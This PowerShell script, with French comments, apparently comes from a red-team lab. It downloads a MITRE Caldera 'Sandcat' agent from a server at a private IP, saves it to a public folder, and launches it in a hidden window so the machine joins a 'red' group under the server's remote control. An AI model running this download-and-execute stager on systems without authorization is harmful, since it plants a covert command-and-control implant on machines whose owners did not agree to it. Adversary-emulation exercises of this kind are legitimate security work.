param(
    [string]$CalderaServer = "http://192.168.100.96:8888",   
    [string]$OutPath = "C:\Users\Public\sandcat.exe"
)

Write-Host "[*] Deploy Sandcat agent depuis $CalderaServer" -ForegroundColor Cyan
$DownloadUrl = "$CalderaServer/file/download"

try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("platform","windows")
    $wc.Headers.Add("file","sandcat.go")
    Write-Host "[*] Téléchargement vers $OutPath ..."
    $wc.DownloadFile($DownloadUrl, $OutPath)
    Write-Host "[+] Téléchargement terminé." -ForegroundColor Green

    # Donner des droits lecture
    icacls $OutPath /grant Everyone:`(R`) | Out-Null

    # Lancer le binaire (adapter arguments si nécessaire)
    $args = "-server $CalderaServer -group red"
    Write-Host "[*] Lancement : $OutPath $args"
    Start-Process -FilePath $OutPath -ArgumentList $args -WindowStyle Hidden
    Write-Host "[+] Agent démarré (hidden)." -ForegroundColor Green
}
catch {
    Write-Error "Erreur: $_"
}
